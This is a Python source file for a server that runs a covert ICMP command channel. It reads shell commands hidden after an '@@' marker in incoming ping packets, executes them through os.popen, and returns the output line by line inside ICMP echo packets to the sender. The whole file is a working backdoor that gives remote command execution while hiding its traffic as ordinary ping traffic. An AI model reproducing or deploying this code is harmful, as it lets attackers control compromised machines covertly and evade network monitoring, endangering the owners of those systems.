import os
import socket
import struct
import time
import re
import argparse

ICMP_ECHO_REQUEST_TYPE = 8
ICMP_ECHO_REQUEST_CODE = 0


def checksum(packet):
    def carry_around_add(a, b):
        c = a + b
        return (c & 0xffff) + (c >> 16)
    s = 0
    packet = bytearray(packet)
    for i in range(0, len(packet), 2):
        try:
            w = packet[i] + (packet[i + 1] << 8)
        except IndexError:
            w = packet[i] + (0 << 8)
        s = carry_around_add(s, w)
    chsum = ~s & 0xffff
    chsum = ((chsum & 0x00ff) << 8) + ((chsum & 0xff00) >> 8)
    return chsum


def send_one_ping(my_socket, dest_addr, my_id, payload):
    data = str.encode("@@" + payload)
    dest_addr = socket.gethostbyname(dest_addr)
    # Header: type (8), code (8), checksum (16), id (16), sequence (16)
    fmt = "bbHHh"
    # Make a dummy header with a 0 checksum
    my_checksum = 0
    header = struct.pack(fmt, ICMP_ECHO_REQUEST_TYPE, ICMP_ECHO_REQUEST_CODE, my_checksum, my_id, 1)
    # Calculate the checksum on the data and the dummy header.
    my_checksum = checksum(header + data)
    header = struct.pack(fmt, ICMP_ECHO_REQUEST_TYPE, ICMP_ECHO_REQUEST_CODE, socket.htons(my_checksum), my_id, 1)
    packet = header + data
    my_socket.sendto(packet, (dest_addr, 1))  # Don't know about the 1


def send_one(dest_addr, delay, payload):
    icmp = socket.getprotobyname("icmp")
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
    my_id = os.getpid() & 0xFFFF
    send_one_ping(my_socket, dest_addr, my_id, payload)
    my_socket.close()
    time.sleep(delay)


def execute(cmd):
    output = os.popen(cmd)
    return output


def parse_args():
    parser = argparse.ArgumentParser(description="A simple server that communicates \n"
                                                 "with client via covert ICMP channel\n"
                                                 "executes commands and sends output back to client")
    parser.add_argument("host", help="The interface to listen requests")
    parser.add_argument("ping_delay", help="Delay between answer pings", nargs='?', type=int, default=1)
    args = parser.parse_args()
    return args


def main():
    args = parse_args()
    host = args.host
    ping_delay = args.ping_delay
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.bind((host, 0))
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    #  s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
    print("Server Started......")
    while True:
        # while 1:
        data = s.recvfrom(65565)
        d1 = data[0]
        if bytearray(d1)[20] != ICMP_ECHO_REQUEST_TYPE:
            continue
        d1 = str(d1)
        data1 = re.search('@@(.*)', d1)
        command = data1.group(0)
        cmd = command[2:len(command)-1]
        d = data[1]
        d1 = str(d)
        ip = d1[2:-5]
        # print ip
        print(cmd)  # Holding the command to execute
        print(ip)  # Holding the destination address to send the ping
        output = execute(cmd)
        for line in output.readlines():
            send_one(ip, ping_delay, line)
            # s.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)


if __name__ == '__main__':
    main()
